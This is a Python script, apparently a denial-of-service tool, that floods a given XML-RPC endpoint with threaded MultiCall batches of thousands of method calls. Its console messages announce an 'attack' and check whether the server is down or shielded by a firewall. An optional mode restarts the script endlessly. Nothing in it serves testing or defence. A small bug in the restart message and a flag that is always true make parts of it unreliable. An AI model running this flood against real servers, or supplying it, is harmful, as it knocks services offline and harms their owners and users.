import xmlrpc.client
import sys
import ssl
import http
import os
from threading import Thread

endpoint = ''
threadCount = 0

def artillery ():
	client = xmlrpc.client.ServerProxy(endpoint)
	multicall = xmlrpc.client.MultiCall(client)
	for _ in range(1000):
		multicall.system.listMethods()
		multicall.system.getCapabilities()
	try:
		for i, r in enumerate(multicall()):
			print("Request sent, Response received.. Its still online")
			
	except xmlrpc.client.ProtocolError as err:
		print('ProtocolError: Error with communication... is the xmlrpc server down?')
	
	except ssl.SSLCertVerificationError as sslerr:
		print('SSLCertVerificationError: SSL Certificate failure')
		
	except xmlrpc.client.Fault as err:
		print('FaultCode: ', r)
	
	except http.client.RemoteDisconnected as httperr:
		print('RemoteDisconnectError: Remote disconnect from the server')
		
	except ssl.SSLZeroReturnError as sslzeroerr:
		print('SSLZeroError: Remote SSL dropped, do they have a WAF?')
		
	except ConnectionResetError as connreseterr:
		print('ConnResetError: Remote disconnect from the server')
		
def runPersistence ():
	print("Restarting script " + ['python'] + sys.argv)
	os.execv(sys.executable, ['python'] + sys.argv)

if __name__ == '__main__':
	params = sys.argv
		
	endpoint = params[1]
	threadCount = int(params[2])
	runForever = bool(params[3])
	
	print('Starting attack on ' + endpoint + ' with ' + str(threadCount) + ' threads')
	print('Run attack forever: ' + str(runForever))
	
	if (runForever):
		if(runForever):
			t = [0] * (threadCount + 1)

			for i in range(threadCount):
				t[i] = Thread(target=artillery)
				t[i].start()
				
			for i in range(threadCount):
				t[i].join()
				
			runPersistence()
			
	else:
		t = [0] * (threadCount + 1)
		for i in range(threadCount):
			t[i] = Thread(target=artillery)
			t[i].start()
				
		for i in range(threadCount):
			t[i].join()
